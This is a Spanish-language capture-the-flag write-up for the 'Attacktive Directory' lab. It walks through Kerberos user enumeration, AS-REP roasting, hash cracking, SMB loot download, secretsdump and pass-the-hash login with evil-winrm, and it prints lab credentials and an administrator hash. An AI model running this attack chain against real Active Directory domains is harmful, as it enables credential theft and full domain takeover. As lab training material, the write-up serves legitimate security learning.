<h1 align="center"> Attacktive Directory </h1>

# SETUP

Esta CTF no pide que tenemos que tener la posiblidad de hacer comandos con python
```
python comando
```
Posteriormente cogernos el repositorio de impacket

```
git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
```

Después de cloran el repositorio instalar 

```
pip3 install -r /opt/impacket/requirements.txt
cd /opt/impacket/ && python3 ./setup.py install
```

## INSTALAR BLOODHOUND Y NEo4j

Son otras herramientas que se utilizan para atacar AD. Escepecificamente este

```
apt install bloodhound neo4j
apt update && apt upgrade
```

# ENUMERACIÓN

Test de conectividad

![image](https://github.com/user-attachments/assets/dc3bb957-d6f0-413f-866b-936e935531d2)

Escáner de puertos

![image](https://github.com/user-attachments/assets/fd0d79d8-48fe-4eb9-ad88-8611c0a909f0)

Encontramos bastante información relevante y muchos puertos abiertos, nosotros nos centraremos en los puertos 139/445 enumeramemos dichos puertos con 

"enum4linux"

```
enum4linux -a ip
```

Sacamos información relevante.

![image](https://github.com/user-attachments/assets/356b89c9-b25b-45a9-b66a-34687c9beae1)

Sacamos el nombre del dominio : THM-AD

## ENUMERAR USUARIOS CON KERBEROS

Muchos host utilizan otors servicios, como Kerberos, Kerberos es un servicio de autenticación con AD, con el puerto abierto, podemos utilizar "Kerbrute" para descubrir usuarios, contraseñas etc.

Para esta CTF en especial nos dan una lista de usuario y contraseñas y para que nos descarguemos la herramienta vamos a ello.

Hacemos simplemente un wget a la ip en cuestion

```
wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
```

Añadimos el dominio a etc host para una enumeración más facil

```
echo "10.10.95.92 spookysec.local" | sudo tee -a /etc/hosts
10.10.95.92 spookysec.local
```

```
./kerbrute_linux_amd64  userenum -d spookysec.local --dc spookysec.local userlist.txt -t 100
```

![image](https://github.com/user-attachments/assets/d60a838f-2094-4c8a-82f0-497b1e05470e)

Encontramos 16 usuarios validos 

Con usuarios importantes como "svc-admin" o "backup"

## Abusando de Kerberos

Una vez enumerados los usuarios, podemos utilizar meotodos de ataques a kerberos llamado "ASREPRoasting". El cual utiliza una cuenta que no requiera autentificación, para que nos devuelva un ticket valido de un usuario especfico.

"impacket" tiene una herramienta llamada "GetNPUsers.py" localizada en "impacket/examples/GetNPUsers.py" 

```
find / -type f -name 'GetNPUsers.py'
```

```
python3.9 /opt/impacket/examples/GetNPUsers.py  spookysec.local/svc-admin -no-pass
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:95cc8d1fc277497717a2c5084f6e3b68$2ddeb5e133f102393560209cf9d98b4bc3a59d96ed167d4fee116d8ae72148a49d04e85cec84e02e569c75f3cfd95b83ddf58a6b531c3d2d79cf2111729f0c161f81c207f268ddc4b81a8acdc008160b4a7189929a20a2a6440895a46615e575b2dbab50b047c927c01d61611983d65342de2f7c58774264fe7b7e4b3a5b6e3b8bab2322c2a01bdd2d16fea985f3380918126dc9ab9d07e4489a4c28c9ceb5da1f0adc60a75afea7c81028fa35c12c98f30348ae6b78243b1342cec063d53f8e4a5baab7d7c586cd853ec7a3179933d782824408166078bb1bf389a057f7b5b5ead36480153a6427595217ae79ee766463ba
```

Vamos a probar a identificar el hash y probar a desencriptarlo. (Kerberos 5 AS-REP etype 23)

```
john kerbhash --wordlist=passwordlist.txt 
Warning: detected hash type "krb5asrep", but the string is also recognized as "krb5asrep-aes-opencl"
Use the "--format=krb5asrep-aes-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
management2005   (?)
1g 0:00:00:00 DONE (2024-09-19 08:28) 33.33g/s 221866p/s 221866c/s 221866C/s horoscope..amy123
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Con las credenciales de usuario podemos acceder al dominio y enumerar los controladores

Utilizaremos smbclient para ir enumerando o smbmap

```
smbmap -H spookysec.local -d spookysec.local -u svc-admin -p mxxxxxxxxxxxxx
[+] Finding open SMB ports....
[+] User SMB session established on spookysec.local...
[+] IP: spookysec.local:445     Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        .                                                  
        dr--r--r--                0 Sat Apr  4 19:08:39 2020    .
        dr--r--r--                0 Sat Apr  4 19:08:39 2020    ..
        fr--r--r--               48 Sat Apr  4 19:08:53 2020    backup_credentials.txt
        backup                                                  READ ONLY
        C$                                                      NO ACCESS       Default share
        .                                                  
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    InitShutdown
        fr--r--r--                4 Mon Jan  1 00:00:00 1601    lsass
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    ntsvcs
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    scerpc
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-3e8-0
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    epmapper
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-290-0
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    LSM_API_service
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    eventlog
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-428-0
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    TermSrv_API_service
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    Ctx_WinStation_API_service
        fr--r--r--                4 Mon Jan  1 00:00:00 1601    wkssvc
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-30c-0
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-30c-1
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    SessEnvPublicRpc
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    atsvc
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-3b8-0
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-710-0
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    RpcProxy\49671
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    72bba0c63ba338fa
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    RpcProxy\593
        fr--r--r--                4 Mon Jan  1 00:00:00 1601    srvsvc
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    spoolss
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-880-0
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    netdfs
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    W32TIME_ALT
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-2fc-0
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-9d8-0
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-97c-0
        IPC$                                                    READ ONLY       Remote IPC
        .                                                  
        dr--r--r--                0 Sat Apr  4 18:39:35 2020    .
        dr--r--r--                0 Sat Apr  4 18:39:35 2020    ..
        NETLOGON                                                READ ONLY       Logon server share 
        .                                                  
        dr--r--r--                0 Sat Apr  4 18:39:35 2020    .
        dr--r--r--                0 Sat Apr  4 18:39:35 2020    ..
        dr--r--r--                0 Sat Apr  4 18:39:35 2020    spookysec.local
        SYSVOL                                                  READ ONLY       Logon server share 
root@kali:~#
```

Como vemos tenemos archivos como "backup_credentials.txt" que podemos descargar utilizaremos metasploit

```
use auxiliary/admin/smb/download_file 
msf6 auxiliary(admin/smb/download_file) >
```

![image](https://github.com/user-attachments/assets/8bac2288-338c-4037-9a9c-5fc4b3050511)

run

```
 10.10.95.92:445       - backup_credentials.txt saved as: /root/.msf4/loot/20240919084630_default_10.10.95.92_smb.shares.file_884923.txt
[*] spookysec.local:445   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(admin/smb/download_file) > 
```

```
cat /root/.msf4/loot/20240919084630_default_10.10.95.92_smb.shares.file_884923.txt 
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYwroot@ip-10-10-238-208:~# 
```

Decodificamos con cyberchef

backup@spookysec.local:backup2517860

Ahora que disponemos de las credenciales de otro usuario, vamos a probar a elevar privilegios con la cuenta "backup"

Con esta podemos dumpear los hashes de los controladores usando "secretsdump.py"

```
find / -type f -anme 'secretsdump.py'
```
0e0363213e37b94221497260b0bcb4fc 

Posteriormente podemos utilizar evil-winr y asi aprendemos

```
git clone https://github.com/Hackplayers/evil-winrm.git
gem install evil-winrm
```

```
evil-winrm -i 10.10.95.92 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
PS C:\Users\Administrator\Documents> whoami
thm-ad\administrato
```

GG GENTE!!!!








